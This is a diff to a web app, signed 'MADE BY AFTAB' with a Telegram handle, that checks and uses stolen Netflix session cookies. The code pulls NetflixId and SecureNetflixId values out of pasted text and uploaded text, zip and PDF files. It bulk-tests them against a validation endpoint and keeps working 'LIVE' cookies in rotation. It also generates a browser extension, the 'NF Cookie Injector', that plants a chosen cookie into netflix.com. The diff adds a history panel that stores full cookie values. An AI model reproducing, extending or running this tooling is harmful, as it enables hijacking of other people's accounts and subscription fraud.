@@ -13,6 +13,7 @@
   --line:rgba(0,240,255,.25);
   --mgl:rgba(255,43,214,.25);
   --dim:#7a8399;
+  --nf:#e50914;
 }
 *{box-sizing:border-box}
 html,body{margin:0;padding:0;background:var(--bg);color:#e8f6ff;font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace;min-height:100vh}
@@ -28,41 +29,106 @@ body::after{
     radial-gradient(circle at 85% 90%,rgba(255,43,214,.10),transparent 45%);
 }
 
-/* ================= INTRO ================= */
+/* ================= NETFLIX INTRO ================= */
 #intro{
   position:fixed;inset:0;z-index:9999;background:#000;
   display:flex;align-items:center;justify-content:center;flex-direction:column;
-  transition:opacity .6s ease,visibility .6s ease;
+  transition:opacity .7s ease,visibility .7s ease;
+  overflow:hidden;
 }
 #intro.gone{opacity:0;visibility:hidden;pointer-events:none}
-.nf-logo{
-  font-family:"Arial Black",Arial,sans-serif;
-  font-weight:900;font-size:clamp(80px,26vw,190px);
-  letter-spacing:-.06em;line-height:.85;
-  color:#e50914;position:relative;
-  text-shadow:0 0 18px rgba(229,9,20,.65),0 0 60px rgba(229,9,20,.35);
-  opacity:0;transform:scale(.6);filter:blur(14px);
-  animation:nfIn 1.1s cubic-bezier(.2,.9,.15,1) .25s forwards;
+
+.nf-stage{
+  position:relative;display:flex;flex-direction:column;align-items:center;
+  perspective:900px;
 }
-.nf-logo::after{
-  content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 45%,rgba(255,255,255,.35) 50%,transparent 55%);
+.nf-N{
+  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
+  font-weight:900;
+  font-size:clamp(110px,32vw,240px);
+  line-height:.8;
+  letter-spacing:-.05em;
+  color:var(--nf);
+  position:relative;
+  transform:scale(.2) rotateY(90deg);
+  opacity:0;
+  filter:blur(20px) brightness(.4);
+  text-shadow:
+    0 0 20px rgba(229,9,20,.9),
+    0 0 60px rgba(229,9,20,.7),
+    0 0 120px rgba(229,9,20,.45);
+  animation:nfReveal 1.15s cubic-bezier(.16,1,.3,1) .25s forwards;
+}
+.nf-N::before,
+.nf-N::after{
+  content:"N";
+  position:absolute;inset:0;
+  font-family:inherit;font-weight:inherit;font-size:inherit;letter-spacing:inherit;line-height:inherit;
+  pointer-events:none;
+}
+.nf-N::before{
+  color:rgba(255,60,80,.55);
+  filter:blur(18px);
+  animation:ghostA 1.2s ease .3s forwards;
+  opacity:0;
+}
+.nf-N::after{
+  color:rgba(255,255,255,.35);
+  filter:blur(40px);
+  animation:ghostB 1.4s ease .4s forwards;
+  opacity:0;
+}
+
+.nf-word{
+  margin-top:6px;
+  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
+  font-weight:900;
+  font-size:clamp(20px,6vw,42px);
+  letter-spacing:.55em;
+  color:var(--nf);
+  text-shadow:0 0 18px rgba(229,9,20,.85),0 0 44px rgba(229,9,20,.5);
+  opacity:0;
+  transform:translateY(14px) scale(.9);
+  animation:nfWord 1s cubic-bezier(.2,.9,.2,1) 1.25s forwards;
+  padding-left:.55em;
+}
+
+.nf-sweep{
+  position:absolute;inset:-40% -10%;
+  background:linear-gradient(105deg,transparent 42%,rgba(255,255,255,.55) 50%,transparent 58%);
   mix-blend-mode:overlay;pointer-events:none;
-  animation:sweep 1.4s ease 1.1s forwards;opacity:0;
+  opacity:0;
+  animation:nfSweep 1.1s ease 1.35s forwards;
 }
-.nf-bars{display:flex;gap:6px;margin-top:18px;opacity:0;animation:bars .5s ease 1.5s forwards}
-.nf-bars span{width:34px;height:6px;background:#e50914;box-shadow:0 0 12px #e50914}
-.nf-tag{margin-top:22px;color:var(--cy);letter-spacing:.5em;font-size:11px;opacity:0;animation:tagIn .5s ease 1.9s forwards}
-@keyframes nfIn{to{opacity:1;transform:scale(1);filter:blur(0)}}
-@keyframes sweep{0%{opacity:0;transform:translateY(-40px)}40%{opacity:1}100%{opacity:0;transform:translateY(60px)}}
-@keyframes bars{to{opacity:1}}
-@keyframes tagIn{to{opacity:1}}
-#skipIntro{
-  position:absolute;bottom:34px;right:24px;
-  background:transparent;border:1px solid var(--dim);color:var(--dim);
-  padding:8px 16px;border-radius:999px;font-family:inherit;font-size:11px;
-  letter-spacing:.2em;cursor:pointer;opacity:0;animation:tagIn .4s ease 1.2s forwards
+
+.nf-fade{
+  position:absolute;inset:0;background:radial-gradient(circle at center,transparent 30%,#000 90%);
+  pointer-events:none;z-index:-1;
 }
-#skipIntro:hover{border-color:var(--cy);color:var(--cy)}
+
+@keyframes nfReveal{
+  0%{opacity:0;transform:scale(.2) rotateY(90deg);filter:blur(20px) brightness(.4)}
+  55%{opacity:1;filter:blur(3px) brightness(1.35)}
+  100%{opacity:1;transform:scale(1) rotateY(0deg);filter:blur(0) brightness(1)}
+}
+@keyframes ghostA{
+  0%{opacity:0;transform:scale(.9)}
+  60%{opacity:1;transform:scale(1.08)}
+  100%{opacity:0;transform:scale(1.25)}
+}
+@keyframes ghostB{
+  0%{opacity:0;transform:scale(.7)}
+  50%{opacity:.9;transform:scale(1.15)}
+  100%{opacity:0;transform:scale(1.5)}
+}
+@keyframes nfWord{
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+@keyframes nfSweep{
+  0%{opacity:0;transform:translateX(-30%)}
+  30%{opacity:.9}
+  100%{opacity:0;transform:translateX(30%)}
+}
 
 /* ================= SHELL ================= */
 .wrap{
@@ -167,45 +233,83 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
 
 .clock{font-size:10px;color:var(--dim);letter-spacing:.25em;text-align:center;margin-bottom:14px}
 
-/* ================= MADE BY AFTAB ================= */
-.made{text-align:center;margin-top:30px}
-.made span{
+/* ================= MADE BY AFTAB + TG ================= */
+.made{text-align:center;margin-top:30px;display:flex;flex-direction:column;align-items:center;gap:14px}
+.made-badge{
   display:inline-block;
   color:#04050a;
   background:linear-gradient(90deg,var(--cy),var(--mg));
-  padding:12px 30px;
+  padding:11px 26px;
   border-radius:999px;
-  font-size:13px;
+  font-size:12px;
   font-weight:900;
-  letter-spacing:.4em;
+  letter-spacing:.35em;
   box-shadow:
-    0 0 24px rgba(0,240,255,.65),
-    0 0 48px rgba(255,43,214,.45),
+    0 0 22px rgba(0,240,255,.6),
+    0 0 44px rgba(255,43,214,.4),
     0 0 0 2px rgba(255,255,255,.08) inset;
   text-shadow:0 0 6px rgba(255,255,255,.35);
-  animation:makerPulse 2.4s ease-in-out infinite;
+  animation:makerPulse 2.6s ease-in-out infinite;
   position:relative;
 }
-.made span::before{
+.made-badge::before{
   content:"";
   position:absolute;inset:-6px;border-radius:999px;
   background:linear-gradient(90deg,var(--cy),var(--mg));
   filter:blur(14px);opacity:.55;z-index:-1;
 }
 @keyframes makerPulse{
-  0%,100%{transform:scale(1);box-shadow:0 0 24px rgba(0,240,255,.65),0 0 48px rgba(255,43,214,.45)}
-  50%{transform:scale(1.04);box-shadow:0 0 34px rgba(0,240,255,.9),0 0 64px rgba(255,43,214,.7)}
+  0%,100%{transform:scale(1);box-shadow:0 0 22px rgba(0,240,255,.6),0 0 44px rgba(255,43,214,.4)}
+  50%{transform:scale(1.035);box-shadow:0 0 32px rgba(0,240,255,.85),0 0 60px rgba(255,43,214,.65)}
 }
+.tg-card{
+  display:inline-flex;align-items:center;gap:10px;
+  border:1px solid rgba(0,240,255,.35);
+  background:linear-gradient(180deg,rgba(0,240,255,.06),rgba(255,43,214,.04));
+  padding:9px 16px;border-radius:999px;
+  box-shadow:0 0 18px rgba(0,240,255,.25);
+  text-decoration:none;
+  transition:transform .15s,box-shadow .2s,border-color .2s;
+}
+.tg-card:hover{transform:translateY(-1px);border-color:var(--cy);box-shadow:0 0 26px rgba(0,240,255,.5)}
+.tg-card svg{width:20px;height:20px;display:block;filter:drop-shadow(0 0 6px rgba(0,240,255,.8))}
+.tg-handle{
+  font-size:12px;font-weight:800;letter-spacing:.15em;
+  background:linear-gradient(90deg,var(--cy),var(--mg));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+
+.hist-item{
+  border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:8px;
+  font-size:10px;color:#b7c6dd;cursor:pointer;transition:border-color .2s,background .2s;
+  position:relative;
+}
+.hist-item:hover{border-color:var(--cy);background:rgba(0,240,255,.05)}
+.hist-item .t{color:var(--cy);display:block;margin-bottom:4px;letter-spacing:.1em}
+.hist-item .meta{color:var(--dim);font-size:9px}
+.hist-item .ck{
+  margin-top:6px;background:#04050a;border:1px solid var(--line);border-radius:6px;
+  padding:6px;font-size:9px;word-break:break-all;color:#9fe9ff;max-height:44px;overflow:hidden;
+}
+.hist-item .tag{
+  position:absolute;top:8px;right:8px;font-size:8px;letter-spacing:.2em;
+  padding:3px 8px;border-radius:999px;font-weight:800;
+}
+.tag.ok{background:rgba(0,240,255,.12);color:var(--cy);border:1px solid var(--cy)}
+.tag.bad{background:rgba(255,43,214,.12);color:var(--mg);border:1px solid var(--mg)}
+.hist-empty{color:#42506a;text-align:center;padding:24px;font-size:11px;letter-spacing:.2em}
 </style>
 </head>
 <body>
 
 <!-- ============ NETFLIX INTRO ============ -->
 <div id="intro">
-  <div class="nf-logo">N</div>
-  <div class="nf-bars"><span></span><span></span><span></span><span></span><span></span></div>
-  <div class="nf-tag">BYPASS</div>
-  <button id="skipIntro">SKIP →</button>
+  <div class="nf-fade"></div>
+  <div class="nf-stage">
+    <div class="nf-N">N</div>
+    <div class="nf-word">NETFLIX</div>
+    <div class="nf-sweep"></div>
+  </div>
 </div>
 
 <!-- ============ APP ============ -->
@@ -261,43 +365,60 @@ button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
     <button class="ghost mg" onclick="showHistory()">VIEW HISTORY</button>
   </div>
 
-  <div class="made"><span>MADE BY AFTAB</span></div>
+  <div class="made">
+    <div class="made-badge">MADE BY AFTAB</div>
+    <a class="tg-card" href="https://t.me/shadow0476" target="_blank" rel="noopener">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <circle cx="12" cy="12" r="11" fill="url(#tgGrad)"/>
+        <path d="M5.5 12.2l11.2-4.3c.5-.2.95.2.78.72l-1.9 8.9c-.15.65-.55.8-1.1.5l-3.05-2.25-1.48 1.42c-.16.16-.3.3-.62.3l.22-3.12 5.7-5.15c.25-.22-.05-.34-.38-.13l-7.05 4.44-3.03-.95c-.65-.2-.66-.65.13-.92z" fill="#04050a"/>
+        <defs>
+          <linearGradient id="tgGrad" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse">
+            <stop offset="0" stop-color="#00f0ff"/>
+            <stop offset="1" stop-color="#ff2bd6"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <span class="tg-handle">@shadow0476</span>
+    </a>
+  </div>
 </div>
 
 <div class="modal" id="historyModal">
   <div class="modal-in">
     <h3>SCAN HISTORY</h3>
-    <button class="danger" onclick="hideHistory()">CLOSE</button>
-    <div id="historyList" style="margin-top:12px"></div>
+    <div class="grid2" style="margin-bottom:12px">
+      <button class="ghost" onclick="hideHistory()">CLOSE</button>
+      <button class="danger" onclick="clearHistory()">CLEAR ALL</button>
+    </div>
+    <div id="historyList" style="margin-top:6px"></div>
   </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
 <script>
-/* ================= INTRO GATE ================= */
+/* ================= INTRO GATE — no skip, auto fade after full animation ================= */
 (function(){
   var intro=document.getElementById('intro');
   var app=document.getElementById('app');
-  function end(){
-    if(intro.classList.contains('gone'))return;
+  setTimeout(function(){
     intro.classList.add('gone');
-    setTimeout(function(){app.classList.add('live')},80);
-  }
-  document.getElementById('skipIntro').addEventListener('click',end);
-  setTimeout(end,2600);
+    setTimeout(function(){app.classList.add('live')},120);
+  }, 2600);
 })();
 
-/* ================= ORIGINAL LOGIC (unchanged) ================= */
+/* ================= STATE ================= */
 var validCookies=[];
 var invalidCookies=[];
 var lastValidCookie='';
 var allChunks=[];
 var rotIndex=0;
 
+/* ================= CLOCK ================= */
 function setClock(){document.getElementById('clock').textContent='CORE: BYPASS // '+new Date().toLocaleTimeString('en-US',{hour12:false})}
 setInterval(setClock,1000);setClock();
 
+/* ================= COOKIE EXTRACTOR ================= */
 function extract(raw){
   if(!raw) return '';
   var keep=['netflixid','securenetflixid','nfvdid'];
@@ -381,6 +502,7 @@ function splitGroups(text){
   return groups;
 }
 
+/* ================= VALIDATE ================= */
 async function validate(cookie){
   try{
     var res=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:cookie,device:'mobile'})});
@@ -389,6 +511,7 @@ async function validate(cookie){
   }catch(e){ return {ok:false,error:e.message} }
 }
 
+/* ================= SINGLE CHECK ================= */
 async function checkSingle(){
   var input=document.getElementById('singleInput').value.trim();
   var status=document.getElementById('status');
@@ -406,13 +529,14 @@ async function checkSingle(){
     document.getElementById('validCount').textContent='1';
     document.getElementById('invalidCount').textContent='0';
     showRotate();
-    addHistory('single',1,0);
+    saveHistory({time:Date.now(),src:'single',valid:true,cookie:norm,profile:r.profile,error:''});
   }else{
     status.className='bad';status.textContent='DEAD — '+r.error;
-    addHistory('single',0,1);
+    saveHistory({time:Date.now(),src:'single',valid:false,cookie:norm,profile:'',error:r.error});
   }
 }
 
+/* ================= FILE READ ================= */
 async function readFileContent(file){
   if(file.name.toLowerCase().endsWith('.pdf')){
     var buf=await file.arrayBuffer();
@@ -428,6 +552,7 @@ async function readFileContent(file){
   return await file.text();
 }
 
+/* ================= BULK UPLOAD ================= */
 async function uploadFile(event){
   var files=event.target.files;
   if(!files.length) return;
@@ -487,8 +612,13 @@ async function uploadFile(event){
     var batch=finalChunks.slice(b,b+batchSize);
     var results=await Promise.all(batch.map(function(c){return validate(c)}));
     for(var r=0;r<results.length;r++){
-      if(results[r].ok) validCookies.push({cookie:batch[r],profile:results[r].profile});
-      else invalidCookies.push({cookie:batch[r],error:results[r].error});
+      if(results[r].ok){
+        validCookies.push({cookie:batch[r],profile:results[r].profile});
+        saveHistory({time:Date.now(),src:'bulk',valid:true,cookie:batch[r],profile:results[r].profile,error:''});
+      }else{
+        invalidCookies.push({cookie:batch[r],error:results[r].error});
+        saveHistory({time:Date.now(),src:'bulk',valid:false,cookie:batch[r],profile:'',error:results[r].error});
+      }
     }
     var done=Math.min(b+batchSize,finalChunks.length);
     var pct=Math.round((done/finalChunks.length)*100);
@@ -505,9 +635,9 @@ async function uploadFile(event){
     rotIndex=0;
     showRotate();
   }
-  addHistory(files.length+' files',validCookies.length,invalidCookies.length);
 }
 
+/* ================= ROTATION ================= */
 function showRotate(){
   var box=document.getElementById('rotateBox');
   if(!validCookies.length){box.classList.remove('on');return}
@@ -547,6 +677,7 @@ function copyCurrent(){
   }
 }
 
+/* ================= EXTENSION ================= */
 function downloadExt(){
   var manifest={manifest_version:3,name:'NF Cookie Injector',version:'1.0',permissions:['cookies','tabs'],host_permissions:['https://*.netflix.com/*'],action:{default_popup:'popup.html'}};
   var popupHtml='<!doctype html><html><body style="width:280px;background:#000;color:#00f0ff;font-family:monospace;padding:12px"><h3>NF Injector</h3><textarea id="c" style="width:100%;height:100px;background:#000;color:#00f0ff;border:1px solid #00f0ff" placeholder="paste cookie"></textarea><button id="go" style="background:#00f0ff;color:#000;padding:10px;border:none;width:100%;margin-top:8px;font-weight:bold">INJECT</button><div id="s" style="margin-top:8px;font-size:11px;color:#ff2bd6"></div><script src="popup.js"><\/script></body></html>';
@@ -564,23 +695,77 @@ function bypassNow(){
   if(navigator.clipboard) navigator.clipboard.writeText(lastValidCookie).then(function(){alert('cookie copied. extension install karo aur paste karo.')});
 }
 
-function getHistory(){try{return JSON.parse(localStorage.getItem('nf_hist')||'[]')}catch(e){return[]}}
-function addHistory(src,v,iv){var h=getHistory();h.unshift({time:new Date().toLocaleString(),src:src,v:v,iv:iv});localStorage.setItem('nf_hist',JSON.stringify(h.slice(0,50)))}
-function showHistory(){
-  var h=getHistory();
+/* ================= HISTORY ================= */
+var HIST_KEY='nf_hist_v2';
+
+function loadHistory(){
+  try{return JSON.parse(localStorage.getItem(HIST_KEY)||'[]')}catch(e){return[]}
+}
+function saveHistory(entry){
+  var h=loadHistory();
+  h.unshift(entry);
+  if(h.length>200) h=h.slice(0,200);
+  localStorage.setItem(HIST_KEY,JSON.stringify(h));
+}
+function clearHistory(){
+  if(!confirm('clear all history?')) return;
+  localStorage.removeItem(HIST_KEY);
+  renderHistory();
+}
+function escapeHtml(s){
+  return String(s||'').replace(/[&<>"']/g,function(c){
+    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
+  });
+}
+function renderHistory(){
   var list=document.getElementById('historyList');
-  if(!h.length){list.innerHTML='<div style="color:#42506a;text-align:center;padding:20px;font-size:11px;letter-spacing:.2em">NO HISTORY</div>'}
-  else{
-    var html='';
-    for(var i=0;i<h.length;i++){
-      html+='<div class="hitem"><span class="t">'+h[i].time+'</span>src: '+h[i].src+'<br>valid: '+h[i].v+' | invalid: '+h[i].iv+'</div>';
-    }
-    list.innerHTML=html;
+  var h=loadHistory();
+  if(!h.length){list.innerHTML='<div class="hist-empty">NO HISTORY</div>';return}
+  var html='';
+  for(var i=0;i<h.length;i++){
+    var e=h[i];
+    var dt=new Date(e.time).toLocaleString();
+    var tag=e.valid?'<span class="tag ok">LIVE</span>':'<span class="tag bad">DEAD</span>';
+    var prof=e.profile?('profile: '+escapeHtml(e.profile)):('err: '+escapeHtml(e.error||'?'));
+    html+='<div class="hist-item" data-idx="'+i+'" onclick="openHistoryItem('+i+')">'+
+      tag+
+      '<span class="t">'+escapeHtml(dt)+'</span>'+
+      '<div class="meta">src: '+escapeHtml(e.src)+' · '+prof+'</div>'+
+      '<div class="ck">'+escapeHtml(e.cookie)+'</div>'+
+    '</div>';
   }
+  list.innerHTML=html;
+}
+function openHistoryItem(idx){
+  var h=loadHistory();
+  var e=h[idx];
+  if(!e) return;
+  var input=document.getElementById('singleInput');
+  input.value=e.cookie;
+  hideHistory();
+  if(e.valid){
+    lastValidCookie=e.cookie;
+    validCookies=[{cookie:e.cookie,profile:e.profile||'?'}];
+    invalidCookies=[];
+    rotIndex=0;
+    document.getElementById('validCount').textContent='1';
+    document.getElementById('invalidCount').textContent='0';
+    var st=document.getElementById('status');
+    st.className='ok';st.textContent='LIVE — '+(e.profile||'?');
+    showRotate();
+  }else{
+    var st2=document.getElementById('status');
+    st2.className='bad';st2.textContent='DEAD — '+(e.error||'?');
+  }
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function showHistory(){
+  renderHistory();
   document.getElementById('historyModal').classList.add('on');
 }
 function hideHistory(){document.getElementById('historyModal').classList.remove('on')}
 
+/* ================= PDF WORKER ================= */
 if(window.pdfjsLib) pdfjsLib.GlobalWorkerOptions.workerSrc='https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
 </script>
 </body>
